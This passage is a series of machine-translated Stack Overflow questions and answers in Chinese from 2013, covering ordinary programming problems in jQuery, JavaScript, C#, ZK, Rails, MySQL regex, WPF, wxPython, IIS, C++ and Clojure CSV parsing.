    read = contact_messages.find('a[role=read], a[role=unread]'),
    title = 'Contact Message Delete',
    message = 'Are you sure you want to delete this message?';
    delete_admin(title, message);

    function msg_load(container, url)
    {
        container.slideUp('fast', function(){
                container.empty().load(url, function(){
                    container.slideDown('fast');
            });
        });
    };

    // AJAX MESSAGES SHOWING
    show_msg.on('click', function(e){
        var $this = $(this),
        url = $this.attr('href'),
        url_info =  url + ' .basic_info > *',
        url_msg =  url + ' .contact_messages > *';

        msg_load(basic_info, url_info);
        msg_load(contact_messages, url_msg);

        return false;
    });

 });
</script> 
```

加载后，设置的变量不可用（或它们不存在）。如何重新声明这个变量（变量的 HTML 部分在容器内）？

[页面渲染](http://pastebin.ca/2366350)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-25T12:46:51.233

要`basic_info`引用`basic_info`类的所有元素，必须在 DOMReady 之后进行赋值。如果`basic_info`元素的数量可能发生变化，则必须在您希望信息有效的时间点进行分配。

# javascript - 太多小数+样式在网站上不可见

> ID：16215133
> 
> 赞同：1
> 
> 时间：2013-04-25T12:44:52.330
> 
> 标签：javascript, colors, styling, decimal

我下面的脚本在返回值中显示了太多的小数点

另外，当我将代码发布到我的网站上时，它没有显示我添加的所有文本样式

你能告诉我我错过了什么吗？

谢谢

```
<html>

    <head>
    <style>
            body {color:rgb(128,128,128);}
            p.3 {color:rgb(128,128,128);}
            p.3 {font-size:20PX;}
    </style>

    <script type = "text/javascript">

    function convert() {
        var Amount=document.getElementById('amount');
        var Currency=document.getElementById('currency');
        var Converted=document.getElementById('converted');
        var Choice=document.getElementById('choice');
        var AED=1;
        var US=0.27;
        var QR=0.99;
        var SR=1.02;
        var KD=0.0778;
        var BD=0.102;

        switch(document.converter.currency.value) {
            case "US Dollars" :
                document.converter.converted.value=US*document.converter.amount.value;
                document.converter.choice.value=document.converter.currency.value;
            break;
            case "Qatar Riyal":
                document.converter.converted.value=QR*document.converter.amount.value;
                document.converter.choice.value=document.converter.currency.value;
            break;
            case "Saudi Riyal":
                document.converter.converted.value=SR*document.converter.amount.value;
                document.converter.choice.value=document.converter.currency.value;
            break;
            case "Kuwaiti Dinar":
                document.converter.converted.value=KD*document.converter.amount.value;
                document.converter.choice.value=document.converter.currency.value;
            break;
            case "Bahrain Dinar":
                document.converter.converted.value=BD*document.converter.amount.value;
                document.converter.choice.value=document.converter.currency.value;
            break;
        }
    }
    </script>

    </head>

    <body>
        <div id="divWrapper">
        <form name="converter" id="converter">
        <br/> Enter amount in UAE Dirhams
        <input name="amount"type="text" id="amount" size="3" />
        <br /><br /> 
        Please Select a currency <select name="currency" id="currency">
        <option>Select one</option>
        <option value="US Dollars">US Dollars</option>
        <option value="Qatar Riyal">Qatar Riyal</option>
        <option value="Saudi Riyal">Saudi Riyal</option>
        <option value="Kuwaiti Dinar">Kuwaiti Dinar</option>
        <option value="Bahrain Dinar">Bahrain Dinar</option>
        </select> 

        <input type="button" name="convt" id="convt" onclick="convert()" value="Convert" />
        <br /><br /> 
        <p class="3"> The amount is:
        <input name="converted" type="text" id="converted" style="border:0px" style="color:rgb(255,0,102)" style="text-align:center" style="font-size:22PX"  value="" size="5"/>
        in 
        <input name="choice" type="text" id="choice" style="border:0px" style="color:rgb(255,0,102)" style="font-size:22PX" style="text-align:center" value="" size="10"> </p>

        <br /><br />
        </form>
        </div>
    </body>

</html> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T13:31:46.100

仅适用于 JavaScript：

如果要将数字格式化为固定的小数位数，请致电

```
.toFixed() 
```

在上面。

例如：

```
var i = 3.4444

var num = i.toFixed(2) //num = 3.44, but as a string 
```

在这里查看更多信息：[Mozilla 开发者网络](https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Global_Objects/Number/toFixed)，[ECMAScript 规范](http://www.ecma-international.org/ecma-262/5.1/#sec-15.7.4.5)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-25T13:39:53.553

### 关于 Javascript/小数

假设您希望将事物四舍五入到小数点后两位，您应该使用该`.toFixed()`函数，如[tschulze](https://stackoverflow.com/a/16216149/259014)所述。

以下是如何将其合并到您当前的结构中（您必须对每个案例陈述做类似的事情）：

```
document.converter.converted.value=(BD*document.converter.amount.value).toFixed(2);
document.converter.choice.value=document.converter.currency.value; 
```

* * *

### 关于造型

您在样式方面遇到的问题是由于具有多个样式属性。应用多种样式的正确方法是将您设置的所有不同方面设置在一个样式属性中，用分号分隔：

```
<input name="converted" type="text" id="converted" style="border:0; color:rgb(255,0,102); text-align:center; font-size:22PX;" value="" size="5"/> 
```

* * *

### 补充笔记

似乎您可以通过切换到具有单个集合乘数的结构来真正简化代码，然后根据适合的情况选择要应用的结构：

```
function convert() {
    var Amount=document.getElementById('amount');
    var Currency=document.getElementById('currency');
    var Converted=document.getElementById('converted');
    var Choice=document.getElementById('choice');
    var multiplier=1;

    switch(document.converter.currency.value) {
        case "US Dollars" : multiplier=0.27; break;
        case "Qatar Riyal": multiplier=0.99; break;
        case "Saudi Riyal": multiplier=1.02; break;
        case "Kuwaiti Dinar": multiplier=0.0778; break;
        case "Bahrain Dinar": multiplier=0.102; break;
    }

     document.converter.converted.value=(multiplier*document.converter.amount.value).toFixed(2);
     document.converter.choice.value=document.converter.currency.value;
} 
```

# c# - 如何将 Animal 实例变成 Dog 实例？

> ID：16215143
> 
> 赞同：6
> 
> 时间：2013-04-25T12:45:18.740
> 
> 标签：c#, oop, inheritance

假设我有以下课程：

```
class Animal
{
    public long Id { get; set; }
    public string Name { get; set; }
}

class Dog:Animal
{
    public void sniffBum()
    {
        Console.WriteLine("sniff sniff sniff");
    }
} 
```

如果我有一个实例`Animal`，我如何将它转换为一个`Dog`？像这样的东西：

```
Animal a = new Animal();
if ( some logic to determine that this animal is a dog )
{
    Dog d = (Dog)a;
    d.sniffBum();
} 
```

本质上我不能使用接口。我总会有一个`Animal`像这样从我的数据库中出来的对象。`Dog`没有更多的参数`Animal`，只有新的方法。

我可以创建一个新`Dog`对象，然后传递值，（或者有一个采用 type 的构造函数`Animal`），但这看起来很混乱。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-25T12:47:36.287

要检查对象是否可以转换为类型，请使用`is`关键字。

```
Animal animal = new Dog();

if( animal is Dog)
{
    //your code
} 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-04-25T12:49:45.463

首先将动物创建为狗，然后检查它是否 `is`是狗

```
Animal a = new Dog();
if (a is Dog )
{
   Dog d = (Dog)a;
   d.sniffBum();
} 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-04-25T12:49:21.747

您可以使用 来做到这一点`is`，但是由于您要对任何您发现的狗进行呼叫，因此最好使用`as`：

```
var dog = a as Dog;
if (dog != null)
{
    dog.sniffButt();
} 
```

但是您应该知道，这种安排（试图确定一个值的运行时类型以便您可以将其转换为方便的东西）通常是有充分理由不赞成的。您很容易过度使用它并最终检查是否有狗、猫、鹦鹉、鱼、乌龟……我相信您可以想象由此产生的混乱。

如果您的需求指向该场景，则更好的解决方案是使用访问者设计模式。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2013-04-25T12:57:09.523

`Animal`如果实例从未是实例，则强制转换检查将不起作用`Dog`。

您可能想查看[装饰器模式](http://www.codeproject.com/Articles/479635/UnderstandingplusandplusImplementingplusDecoratorp)，它允许您向实例添加`Dog`方法。`Animal`本质上，`Dog`两者`Animal`都有`IAnimal`接口。该类在构造函数中`Dog`获取一个`Animal`实例并保留一个内部引用。的实现只是遵循它引用的`Dog`实例（这允许将转换为并表现得像被包装的多态性）。还具有特定于 Dog的其他方法。`IAnimal``Animal``Dog``IAnimal``Animal``Dog`

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2013-04-25T12:59:50.727

动物永远不可能是狗。

制作您的 Dog 构造函数，将 Animal 作为参数。

```
class Dog : Animal
{
   public Dog(Animal a)
   {
      this.Name = a.Name;
      this.Id = a.Id;
   }

   public void sniffBum()
   {
       Console.WriteLine("sniff sniff sniff");
   }
} 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2013-04-25T12:49:05.790

我不是这样工作的。强制转换是将实例*解释*为给定类型的操作，它不会*更改*其类型。在您的情况下，您必须首先确定该特定数据库行中有哪种动物，然后实例化正确的祖先。伪代码：

```
var row = Fetch from database;
Animal animal;
if (row is a dog) animal = new Dog();
else if (row is a cat) animal = new Cat(); 
```

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2013-04-25T12:52:34.123

你可以这样做：

```
var dog = a as Dog;
if(dog != null)
{
    dog.DoSomething();
} 
```

如果您需要稍后强制转换它，最好检查 a 是否为 Dog。请参阅以下答案： [Casting vs using the 'as' keyword in the CLR](https://stackoverflow.com/questions/496096/casting-vs-using-the-as-keyword-in-the-clr)

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2013-04-25T12:57:37.793

你不能把动物变成狗，它可能是一只猫！我认为您要实现的目标是`Dog`从另一个`Animal`从 db 获取的 type 对象创建一个 type 对象。

`Animal`一种方法是在`Dog`的重载构造函数 中接受类型的对象：

```
class Dog:Animal
{
    public Dog(Animal animal)
    {
        this.Id = animal.Id;
       this.Name = animal.Name;
    }
...
} 
```

这样，您可以简单地使用以下内容：

```
if ( some logic to determine that this animal is a dog )
{
    Dog d = new Dog(a);
    d.sniffBum();
} 
```

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2013-04-25T12:58:27.880

我会在对象上创建一些静态方法，`Dog`或者在某种`DogFactory`地方你可以将你的`Animal`作为参数传递并让它创建你的 Dog，或者 return `null`。

在这种方法中，您可以检查您的动物特征，看看您是否希望它成为一只狗（4 条腿，比特，等等）

否则很难从创建的对象`Animal`到具体`Dog`对象

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2013-04-25T13:35:45.383

Kamyar 是对的，没有办法做到这一点，因为就像你自己告诉我们的那样

```
i will always have an Animal object coming out of my database like that 
```

所以你需要将类型也保存在你的数据库中

之后你应该改变你`Animal`的

```
public class Animal
{
    public long Id { get; set; }
    public string Name { get; set; }
    public string AnimalType { get; private set; }

    public Animal() { }
    public Animal(string type)
    {
        AnimalType = type;
    }

    // to denie self repeading if all animales have the same Properties
    protected void set(Animal a)
    {
        Id = a.Id;
        Name = a.Name;
        AnimalType = a.AnimalType;
    }
} 
```

.

```
Dog doesnt have any more parameters than Animal has, only new methods 
```

所以你可以修改你`Dog`的

```
public class Dog : Animal
{
    public Dog(Animal a) 
    {
        base.set(a);
    }

    public void sniffBum()
    {
        Console.WriteLine("sniff sniff sniff");
    }
} 
```

.

```
i could just create a new Dog object, and pass the values accross, (...), but this just seems messy 
```

我不认为有办法，而且看起来也不那么凌乱

这里是如何使用示例

```
 Animal a = new Animal("Dog");
        if (a.AnimalType =="Dog")
        {
            Dog d = new Dog( a);
            d.sniffBum();
        } 
```

# components - 具有独立列的 ZK 组件

> ID：16215148
> 
> 赞同：0
> 
> 时间：2013-04-25T12:45:35.407
> 
> 标签：components, zk

我是 ZK 框架 [新手] 版本 5.0.8 MVC 方法的新手我正在尝试实现一个组件，它们的列彼此独立....我想做的就是能够表示 2 列上的数据和能够响应对每一列的点击

就像是

```
-----------------------------------
  Company----Company
   Oracle    IBM
   Microsoft Xerox
   HP        Apple
 ----------------------------------- 
```

如果我单击 IBM，我不想单击 Oracle .....[在同一个组件中，我的意思是我不想创建 2 个网格或 2 个列表框，否则]

这可能吗？多谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T15:21:27.233

*目前尚不清楚您在这里的独立性*方面究竟需要什么。您是在寻找数据模型方面的分离，还是只想为每个渲染的单元格设置不同的事件侦听器？

关于事件侦听器，很容易将侦听器附加到您想要的任何东西上。在 ZK 中，[HTMLBasedComponent](http://books.zkoss.org/wiki/ZK_Component_Reference/Base_Components/HtmlBasedComponent#Supported_Events)是常见的根组件之一，并且支持`onClick`、`onDoubleClick`、`onRightClick`等。

由于这些 ZK 组件是动态创建的，因此您无法将[事件侦听](http://books.zkoss.org/wiki/ZK_Developer%27s_Reference/Event_Handling/Event_Listening#Composer_and_Event_Listener_Autowiring)器与`@Listen`注释连接。问题是您事先没有单元格的 id。

相反，您需要在渲染时以[编程方式创建。`EventListener`](http://books.zkoss.org/wiki/ZK_Developer%27s_Reference/Event_Handling/Event_Listening#Event_Listener)

```
// in your RowRenderer

public void render(Row row, Data data, int index) {
    Label column1 = new Label(data.getOne());
    Label column2 = new Label(data.getTwo());
    column1.setParent(row);
    column2.setParent(row);
    column1.addEventListener(Events.ON_CLICK, new EventListener<Event>() {
        public void onEvent(Event event) {
            // handle event
        }
    });
    column2.addEventListener(Events.ON_CLICK, new EventListener<Event>() {
        public void onEvent(Event event) {
            // handle event
        }
    });
} 
```

请注意，正如此处实现的那样，您`EventListener`为每个渲染的单元格创建一个新的。这不是很有效，所以如果你可以让你的`EventListener`无状态并将必要的数据附加到它`Label`本身，你可以节省大量的计算。

关于代码分离，如果您的数据模型是面向列的而不是按行的，那么您将找不到适合这种情况的标准 ZK 组件。也就是说，组件喜欢`Grid`和`Listbox`被渲染为从顶部开始的行使用`RowRenderers`等。如果这是您的问题，您将需要推出自己的组件。这比听起来容易得多。

```
public class ColumnGrid extends Hlayout {

    private ColumnListModel model;
    private ColumnRenderer<? extends Component> renderer;

    public void setModel(ColumnListModel model) {
        this.model = model;
    }

    public void setRenderer(ColumnRenderer renderer) {
        this.renderer = renderer;
    }

    public void onCreate() {
        for (int i=0; i<model.size(); i++) {
            Column col = new Column();
            appendChild(col);
            renderer.render(col, model.getElementAt(i), i);
        }
    }

}

public class Column extends Vlayout {}

public interface ColumnRenderer<T extends Component> {

    render(Column column, T data, int index);

} 
```

它只是一个骨架，但你明白了。

然后，您甚至可以在`zul`文件中使用它：

```
<?component name="colGrid" class="com.sean.is.cool.ColumnGrid" ?>
<colGrid model="myModel" renderer="myColRenderer"/> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-25T14:54:18.877

在像`Components`zk 这样的表中，总是一行等于
一个对象，一列等于该对象的一个​​属性。
这意味着，`Listbox`并且`Grid`不会帮助你。
如果您使用 EE 版本的 zk，我猜您可能喜欢使用[Choosenbox](http://books.zkoss.org/wiki/ZK_Component_Reference/Input/Chosenbox)。否则我认为没有`Component`。

# mysql - 借助用户历史自定义交易应用程序的主页和电子邮件：如何在 Rails/postgreSQL 上以正确的方式进行操作？

> ID：16215150
> 
> 赞同：0
> 
> 时间：2013-04-25T12:45:46.000
> 
> 标签：mysql, ruby-on-rails, ruby-on-rails-3, postgresql

我想定制：

**1\. 主页
上的交易顺序 2\. 电子邮件取决于用户看到的交易。**

感谢[SO 上的人](https://stackoverflow.com/questions/16178707/rails-has-many-and-belongs-to)，似乎最好有 3 个模型和表“standard_user”、“deals”和“deals_participation”，以便拥有**应用程序需要的多对多关系**，一个链接表如下：

```
class DealParticipation < ActiveRecord:Base
#This means the deal_participations table has a standard_user_id key
belongs_to :standard_user
#This means the deal_participations table has a deal_id key
belongs_to :deal
#... more logic goes here ...
end

class StandardUser < ActiveRecord::Base
has_many :deal_participations
has_many :deals, :through => :deal_participations
# ... more logic goes here ...
end

class Deal < ActiveRecord::Base
has_many :deal_participations
has_many :standard_users, :through => :deal_participations
belongs_to :admin_user
#... more logic goes here ...
end 
```

我迷路的地方是：我应该如何存储以及应该查询某个用户参与的哪些交易的数据：

*   我应该存储这个 deal_participation_table 吗？它的列是deals_participation_id/user_id/deals_id，我担心deals_participation表查询起来效率很低，因为我必须搜索大量行，找到user = Mathieu45（示例）的位置，然后找到相应的交易并进行一些交易进行某种计算以了解他对哪种交易感兴趣，然后使用该信息来调整主页上的交易列表（以及发送给他的电子邮件）。
*   我应该将其存储在 users_table 本身中，以便根据 user_id 直接访问他所做的交易吗？
*   将其存储在另一个专用于 user_history 的表中？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T23:54:24.053

如果您在表上放置了正确的索引，您所描述的模式对于您感兴趣的查询类型将非常有效。数据库的行为不像列表：询问“XXX 参与了哪些交易”的问题不应该扫描整个表，因为正确索引的表将确切地知道在哪里可以找到 XXX 的所有交易。

为了正确设置此设置，您的迁移将如下所示：

```
class CreateStandardUsers < ActiveRecord::Migration
  def change
    create_table :standard_users do |t|
      t.string :name
      t.timestamps
      # More fields go here
    end

    add_index :standard_users, :name
  end
end

class CreateDeals < ActiveRecord::Migration
  def change
    create_table :deals do |t|
      t.references :admin_user
      # other fields go here
    end

    add_index :deals, :admin_user_id
    # other indices go here... anything you want to search on efficiently.
  end
end

class CreateDealParticipations < ActiveRecord::Migration
  def change
    create_table :deal_participations do |t|
      t.references :standard_user
      t.references :deal

      t.timestamps
    end

    add_index :deal_participations, :standard_user_id
    add_index :deal_participations, :deal_id
    add_index :deal_participations, :created_at
  end
end 
```

这些迁移中还有更多内容（例如，您应该添加非空约束、唯一性约束等）。但关键是拥有这些索引会使您描述的数据库操作非常快。

# mysql - 需要 [AZ] 集中的字母

> ID：16215156
> 
> 赞同：0
> 
> 时间：2013-04-25T12:46:17.903
> 
> 标签：mysql, regex

我正在尝试使用 REGEX 匹配数据库中的车牌，因此我可以为它们设置一个类型，因此我不必在以后的任何查询中使用 REGEX。

我有两个匹配无日期/爱尔兰盘子的表达式。我需要将爱尔兰盘子与无日期盘子分开。

爱尔兰车牌必须包含字母 I 或 Z，无日期车牌不能包含 I 或 Z。

这两个表达式同时匹配 dateless 和 irish。

```
REGEXP '^[A-Z]{1,3}[0-9]{1,4}$'
REGEXP '^[0-9]{1,4}[A-Z]{1,3}$' 
```

我遇到的问题是排除 IZ，我可以做 [A-HJ-Y]，但这会导致交叉。

如何修改上面的表达式以要求 I 和 Z，然后再修改另一组表达式以排除 I 和 Z。

非常感谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T13:06:19.613

爱尔兰车牌是：

*   `^([IZ][A-Z]{0,2}|[A-Z]([IZ][A-Z]?|[A-Z][IZ]))[0-9]{1,4}$`
*   `^[0-9]{1,4}([IZ][A-Z]{0,2}|[A-Z]([IZ][A-Z]?|[A-Z][IZ]))$`

如果您准备容忍最多 5 个字母，这些可以简化为：

*   `^[A-Z]{0,2}[IZ][A-Z]{0,2}[0-9]{1,4}$`
*   `^[0-9]{1,4}[A-Z]{0,2}[IZ][A-Z]{0,2}$`

无日期车牌是：

*   `^[A-HJ-Y]{1,3}[0-9]{1,4}$`
*   `^[0-9]{1,4}[A-HJ-Y]{1,3}$`

# c# - Listbox ItemTemplate Selector 不选择模板

> ID：16215158
> 
> 赞同：9
> 
> 时间：2013-04-25T12:46:23.243
> 
> 标签：c#, wpf, visual-studio-2010, xaml

我正在尝试在网格内的列表框上使用 ItemTemplateSelector，我在另一个文件上创建该列表框，以便稍后由 MainWindow 调用。

这是我的 DataTemplateSelector 代码

```
 public class TemplateSelector : DataTemplateSelector
{
    public override DataTemplate SelectTemplate(object item, DependencyObject container)
    {
        FrameworkElement element = container as FrameworkElement;
        if (element != null && item != null && item is myClass)
        {
            myClass agg = item as myClass;
            if(agg.myType == a)
            {
                return element.FindResource("greenItemTemplate") as DataTemplate;
            }
            else if (agg.myType == b)
            {
                return element.FindResource("yellowItemTemplate") as DataTemplate;
            }
            else if (agg.myType == c)
            {
                return element.FindResource("redItemTemplate") as DataTemplate;
            }
        }

        return null;
    }
} 
```

这是我的xml

```
 <Grid x:Class="NS.Views.ListView"
  xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
  xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
  xmlns:c="clr-namespace:NS.Commons"
  DataContext="{Binding}">
<Grid.Resources>
    <c:myConverter x:Key="converter" />
    <c:TemplateSelector x:Key="borderSelector" />
    <DataTemplate x:Key="greenItemTemplate">
        <Border BorderThickness="3" BorderBrush="Green">
            <StackPanel HorizontalAlignment="Stretch">
                <TextBlock Text="{Binding Path=GroupName}"/>
                <TextBlock Text="{Binding Path=myType}"/>
            </StackPanel>
        </Border>
    </DataTemplate>
           <DataTemplate x:Key="redItemTemplate">
        <Border BorderThickness="3" BorderBrush="Red">
            <StackPanel HorizontalAlignment="Stretch">
                <TextBlock Text="{Binding Path=GroupName}"/>
                <TextBlock Text="{Binding Path=myType}"/>
            </StackPanel>
        </Border>
    </DataTemplate>
   <DataTemplate x:Key="yellowItemTemplate">
        <Border BorderThickness="3" BorderBrush="Yellow">
            <StackPanel HorizontalAlignment="Stretch">
                <TextBlock Text="{Binding Path=GroupName}"/>
                <TextBlock Text="{Binding Path=myType}"/>
            </StackPanel>
        </Border>
    </DataTemplate>
</Grid.Resources>

<ListBox ItemsSource="{Binding myCollectionOfMyClassObjects}" 
         Name="listBox1"
         HorizontalContentAlignment="Stretch"  
         ItemTemplateSelector="{StaticResource borderSelector}"
         >
</ListBox> 
```

但是，虽然绑定工作正常（未格式化的对象列表出现在列表中），但 ItemTemplateSelector 并未调用 TemplateSelector 方法。我在方法的开头放置了一个断点，它从未被调用过。

有谁知道可能是什么问题？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-04-25T17:27:42.980

@Rachel 是对的。您`DataTemplateSelector`只会在加载时调用一次，而不是`INPC`更改。

您可以根据需要做的是使用 a`ListBoxItemStyle`来`DataTrigger`切换`Template`使用的

就像是：

```
<ControlTemplate x:Key="greenItemTemplate">
  <Border BorderBrush="Green"
          BorderThickness="3">
    <StackPanel HorizontalAlignment="Stretch">
      <TextBlock Text="{Binding Path=GroupName}" />
      <TextBlock Text="{Binding Path=myType}" />
    </StackPanel>
  </Border>
</ControlTemplate>
<ControlTemplate x:Key="redItemTemplate">
  <Border BorderBrush="Red"
          BorderThickness="3">
    <StackPanel HorizontalAlignment="Stretch">
      <TextBlock Text="{Binding Path=GroupName}" />
      <TextBlock Text="{Binding Path=myType}" />
    </StackPanel>
  </Border>
</ControlTemplate>
<ControlTemplate x:Key="yellowItemTemplate">
  <Border BorderBrush="Yellow"
          BorderThickness="3">
    <StackPanel HorizontalAlignment="Stretch">
      <TextBlock Text="{Binding Path=GroupName}" />
      <TextBlock Text="{Binding Path=myType}" />
    </StackPanel>
  </Border>
</ControlTemplate>
<Style x:Key="MyListBoxItemStyle"
        TargetType="{x:Type ListBoxItem}">
  <Setter Property="Template"
          Value="{DynamicResource greenItemTemplate}" />
  <Style.Triggers>
    <DataTrigger Binding="{Binding myType}"
                  Value="c">
      <Setter Property="Template"
              Value="{DynamicResource redItemTemplate}" />
    </DataTrigger>
    <DataTrigger Binding="{Binding myType}"
                  Value="b">
      <Setter Property="Template"
              Value="{DynamicResource yellowItemTemplate}" />
    </DataTrigger>
  </Style.Triggers>
</Style> 
```

和用法：

```
<ListBox ItemContainerStyle="{StaticResource MyListBoxItemStyle}"
         ItemsSource="{Binding myCollectionOfMyClassObjects}" 
         Name="listBox1"
         HorizontalContentAlignment="Stretch" /> 
```

# python - 查找 wxpython 事件文档

> ID：16215159
> 
> 赞同：0
> 
> 时间：2013-04-25T12:46:27.523
> 
> 标签：python, wxpython, wxwidgets

如何查看wxpython发布的各种事件的功能和属性？

当绑定函数被触发时，一个事件被发送到绑定函数，例如：

```
self.Bind(wx.EVT_BUTTON, self.eventButtonFunction, self.button)
...
def eventButtonFunction(self,event): 
```

每个小部件（例如复选框、切换按钮等）都有一组不同的属性和功能。我在文档中找不到此信息，因此一直使用 dir 将它们全部打印出来，如下所示：

```
def eventButtonFunction(self,event):
    for s in dir(event):
        print s 
```

这很烦人。这是在我缺少的某个地方的文档中吗？谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T13:21:50.687

wxPython 文档不像底层 C++ wxWidgets 文档那样完整，因此在许多情况下，您必须使用 C++ 文档，通常将表单的所有符号转换`wxFoo`为`wx.Foo`.

您可能正在寻找类似[这个 list](http://docs.wxwidgets.org/stable/wx_eventhandlingoverview.html#eventmacros)的东西，它是映射到它们所应用的宏的所有事件类的列表，并且每个类都超链接到类定义，尽管它仍然不完整。

从内存中`EVT_BUTTON`生成 a [`wxCommandEvent`](http://docs.wxwidgets.org/stable/wx_wxcommandevent.html#wxcommandevent)，但如果您不确定要获得哪种事件类型，打印`repr`事件对象的 a 应该会有所帮助。

例如...

```
def eventButtonFunction(self, event):
    print repr(event) 
```

...产量...

```
<wx._core.CommandEvent; proxy of <Swig Object of type 'wxCommandEvent *' at 0x21eaec> > 
```

刚开始会有点痛，但是用了一段时间wxPython就会习惯了。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-25T13:30:36.203

你必须去这些文档，诚然，这些文档令人困惑：

[http://wxpython.org/docs/api/wx.Event-class.html](http://wxpython.org/docs/api/wx.Event-class.html)

所有事件都源自该事件。因此，您必须单击一个子类才能查看添加了哪些其他方法。其中一些子类有额外的子类和方法。是的，有点丑。

# asp.net - 当子目录中的 web.config 存在时，IIS7.5 服务器错误 500

> ID：16215162
> 
> 赞同：0
> 
> 时间：2013-04-25T12:46:37.420
> 
> 标签：asp.net, iis, iis-7.5, nlb

我有 2 台 IIS7 服务器在 NLB 集群中工作，并由 DFSR 服务复制。有用。

每一个我都有 ASP.NET 应用程序。它有它的 web.config 文件。此文件已复制，因此在两台服务器上都是相同的。然而，有一个目录没有被复制。这是我放置 AJAX 脚本数据的特殊目录。里面的文件不断更新。

然后我尝试使用放在我的特殊 AJAX 目录中的 web.config 文件启用 CORS。

它适用于第一台服务器，不适用于第二台服务器。在第二个中，当我尝试访问 AJAX 目录中的任何文件时出现错误 500。

我已经仔细检查过任何 web.config 内容都会出现错误。如果此目录中存在 web.config 文件，则 Web 服务器拒绝从那里提供文件。该问题与 web.config 内容无关。我手动创建了文件，并使用 IIS 管理器。无论我设置什么，如果文件存在，我都会得到 500，句号。

我的第一台服务器上没有这样的问题。它接受 web.config 中的所有有效配置。

两台服务器使用完全相同的配置。它们是（或至少应该是）克隆。

我检查了系统日志 - 没有那些 500 的痕迹。怎么了？如果 IIS7 不接受应用程序子目录中的任何 web.config 文件，可能会损坏或配置错误？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-30T19:02:27.393

当您想在子目录中使用第二个 web.config 时，您只需要将这个或包含子目录转换为 IIS 管理器中的应用程序。就这样。作为魅力发挥作用。

# c++ - 函数调用中的运算符 New

> ID：16215164
> 
> 赞同：0
> 
> 时间：2013-04-25T12:46:46.890
> 
> 标签：c++, arguments, new-operator, operator-keyword

```
void F(A* a)
{
    delete a; 
};

F(new A()); 
```

删除运算符是否会释放分配的内存，或者我必须像这样创建和删除对象：

```
F(A* a) {} 

A a = new A();
F(a);
delete a; 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T12:48:20.730

是的，它会释放内存，但最好在 C++11 之前使用诸如[std::shared_ptr](http://en.cppreference.com/w/cpp/memory/shared_ptr)或[boost::shared_ptr之类的智能指针。](http://www.boost.org/doc/libs/1_53_0/libs/smart_ptr/shared_ptr.htm)同样在您的示例中，最好将已释放指针设置为 NULL 以避免双重释放以[避免悬空指针错误。](http://en.wikipedia.org/wiki/Dangling_pointer#Avoiding_dangling_pointer_errors)

```
void F(A*& a)
{
    delete a; 
    a = NULL;
}; 
```

您将无法将其称为`F(new A());`直通，并且需要将引用传递给指针持有变量。就像在第二个变体中一样。应该在`A* a = new A();`那里，以表明这`a`是一个指针。

# parsing - 带有转义逗号的clojure csv

> ID：16215169
> 
> 赞同：3
> 
> 时间：2013-04-25T12:47:07.563
> 
> 标签：parsing, csv, clojure

我正在尝试使用转义逗号解析 clojure 中的 csv 字符串，并且在这样的字段周围没有引号

```
"test1\,test2,test3" 
```

我试过这个库：

*   [org.clojure/data.csv“0.1.2”]
*   [cljcsv“1.3.1”]
*   [clojure-csv/clojure-csv“2.0.0-alpha1”]

但是他们似乎都没有能力正确识别这一点，因为`["test1,test2" "test3"]` 有人知道可以做到这一点的图书馆吗？

提前致谢

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-04-25T14:16:35.470

您并没有完全解析 CSV 数据，而是[对约定的](http://en.wikipedia.org/wiki/Comma-separated_values)一些推导（注意我没有写“标准”）。

在 CSV 中，逗号不会被转义。这是从 C/C++/Java 字符串转义泄漏到您的数据中的东西。如果是典型的 CSV，它会这样写

```
"a,b",c 
```

哪个 clojure-csv 支持。

```
user=> (csv/parse-csv (str "\"a,b\",c")) 
(["a,b" "c"]) 
```

您可能必须编写自己的解析器，或扩展上述库之一来处理这种情况。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-25T15:49:29.733

你有一个很好的借口来编写你自己的解析器:-)。
您可以使用 Instaparse：[https ://github.com/Engelberg/instaparse](https://github.com/Engelberg/instaparse)

**更新：** 好的，我无法抗拒自己的诱惑 :-)
**更新 2：**允许在带引号的字符串中使用转义字符。

```
(require '[instaparse.core :as insta])

(def custom-csv
  (insta/parser
    "file = (line <eol>)* line
     line = (field <','>)* field
     eol = '\\r'? '\\n'
     <field> = plain-field | quoted-field
     quoted-field = <'\\\"'> (#'[^\"\\\\]+' | escaped-char)* <'\\\"'>
     plain-field = (field-chars | escaped-char)*
     <field-chars> = #'[^\\\\\\r\\n,\\\"]+'
     escaped-char = #'\\\\.'
    "))

(def test-str 
"test1\\,test2,test3
te\\s\\\\t4,\"te,st
5\"")

(custom-csv test-str)
; Result:
; [:file
;  [:line
;   [:plain-field "test1" [:escaped-char "\\,"] "test2"]
;   [:plain-field "test3"]]
;  [:line
;   [:plain-field "te" [:escaped-char "\\s"] [:escaped-char "\\\\"] "t4"]
;   "te,st\n5"]]

(->> (custom-csv test-str)
     (insta/transform
       {
         :file list
         :line vector
         :plain-field str
         :quoted-field str
         :escaped-char second
       }))
; Result:
; (["test1,test2" "test3"] ["tes\\t4" "te,st\n5"]) 
```

